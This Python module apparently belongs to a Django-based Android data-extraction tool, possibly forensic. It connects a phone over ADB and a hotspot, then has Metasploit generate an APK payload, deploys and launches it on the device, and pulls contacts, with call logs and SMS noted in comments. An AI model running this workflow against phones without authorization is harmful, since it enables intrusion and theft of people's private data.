from . import AdbHandler, HotspotHandler, LogHandler, MsfHandler, DEPENDENCY_PATH, ARTIFACTS_PATH
import time
import os
import json
import functools
import django
import sys

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'ArgusAPI.settings')
django.setup()

from API.models import ADBStatus

def execute_script(x: str, adb_handler: AdbHandler.AdbHandler):
    """
    This function executes as if its a script. Ashwanth you can move this to a file and run it as a script
    in any way you like mp  
    """
    if (x == "Device Connected"):
        # start the hotspot
        hotspothandler = HotspotHandler.HotspotHandler()
        hotspothandler.create_network_interface()
        adb_handler.send_wifi_payload()
        adb_handler.connect_to_wifi()
        time.sleep(1)
        # Keep on checking if a device is connected to the hotspot using ping
        while True:
            code, output = adb_handler.command_handler.executeCommand(
                ["ping", "-c", "1", hotspothandler.device_ip])
            if code == 0:
                LogHandler.LogHandler().logMessage(
                    "Device connected to hotspot under IP 10.42.0.228")
                break
            time.sleep(2)
        # send a go to home action to close the app on screen
        adb_handler.go_home()
        # sleep for just 5 seconds so that the home screen is cleared away
        time.sleep(5)
        # Get Basic Device Info so that UI can start running
        adb_handler.get_device_info()
        adb_handler.disable_mobile_data()
        # switch over to wireless debugging
        adb_handler.switch_to_wifi_debugging(hotspothandler.device_ip)
        # create metasploit instance
        metasploit_handler = MsfHandler.MsfHandler()
        # generate the metasploit payload apk
        metasploit_handler.generate_payload(hotspothandler.server_ip)
        # deploy the exploit to the android device
        adb_handler.deploy_exploit()
        # launch the exploit
        metasploit_handler.launch_exploit(hotspothandler.server_ip)
        # Copy the exported call logs and sms to our artifacts folder
        # TODO: Ashwanth decide location
        # run adb command to get contacts
        adb_handler.get_contacts()
        # update the JSON file that we have synced all data
        # json_file = json.load(open(ARTIFACTS_PATH+"device_info.json"))
        # json_file["call_logs"] = True
        # json_file["sms"] = True
        # json_file["contacts"] = True
        # json.dump(json_file, open(ARTIFACTS_PATH+"device_info.json", "w"))

        LogHandler.LogHandler().logMessage("All data synced")


def start_payload():
    # start the adb server
    print("into the upload function")
    adb_handler = AdbHandler.AdbHandler()
    adb_handler.stop_server()
    adb_handler.start_server()
    time.sleep(2)
    # adb_handler.get_files()
    # notify if a device is connected
    adb_handler.notify_if_device_connected(execute_script, adb_handler)
    # return {"key": "value"}
